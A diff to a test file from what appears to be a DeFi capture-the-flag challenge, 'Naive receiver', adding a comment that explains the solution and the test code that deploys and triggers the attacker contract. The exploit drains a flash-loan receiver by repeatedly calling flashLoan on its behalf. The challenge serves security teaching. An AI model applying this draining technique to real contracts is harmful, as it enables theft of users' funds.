@@ -30,9 +30,22 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+     /** CODE YOUR EXPLOIT HERE */
 
-        const AttackerFactory = await ethers.getContractFactory('AttackerNaiveReceiver', attacker);
+     /**
+        * Exploit Overview
+        * 
+        * @dev
+        * 
+        * The problem is that the receiver of the loan is naive in the way that anyone can call 
+        * the flashLoan function on behalf of the receiver, so we can run it 10 times to drain the funds
+        * 
+        * To do this in one transaction, use a smart contract that run a for loop.
+        * 
+        * You can find the contracts i wrote on /contracts/attacker-contracts
+     */
+
+        const AttackerFactory = await ethers.getContractFactory('AttackNaiveReceiver', attacker);
         this.contractAttack = await AttackerFactory.deploy(this.receiver.address, this.pool.address)
 
         const tx = await this.contractAttack.Atacar()
